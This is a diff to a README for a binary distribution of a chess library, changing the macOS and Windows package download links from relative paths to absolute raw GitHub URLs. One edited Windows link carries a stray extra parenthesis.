@@ -10,12 +10,12 @@ This repository contains instructions for installing and running a binary distri
  - [Ubuntu 24.04](https://github.com/julien-tierny/chess-referee-bin/raw/refs/heads/main/packages/ubuntu/chesslib-ubuntu-24.04.deb.zip)
 
 ## MacOS packages
- - [Mac OS 13](packages/macos/chesslib-macos-13.tar.gz.zip)
- - [Mac OS 14](packages/macos/chesslib-macos-14.tar.gz.zip)
- - [Mac OS 15](packages/macos/chesslib-macos-15.tar.gz.zip)
+ - [Mac OS 13](https://github.com/julien-tierny/chess-referee-bin/raw/refs/heads/main/packages/macos/chesslib-macos-13.tar.gz.zip)
+ - [Mac OS 14](https://github.com/julien-tierny/chess-referee-bin/raw/refs/heads/main/packages/macos/chesslib-macos-14.tar.gz.zip)
+ - [Mac OS 15](https://github.com/julien-tierny/chess-referee-bin/raw/refs/heads/main/packages/macos/chesslib-macos-15.tar.gz.zip)
 
 ## Windows
- - [Windows 2022](packages/windows/chesslib.exe.zip)
+ - [Windows 2022]((https://github.com/julien-tierny/chess-referee-bin/raw/refs/heads/main/packages/windows/chesslib.exe.zip)
 
 # Installation
 
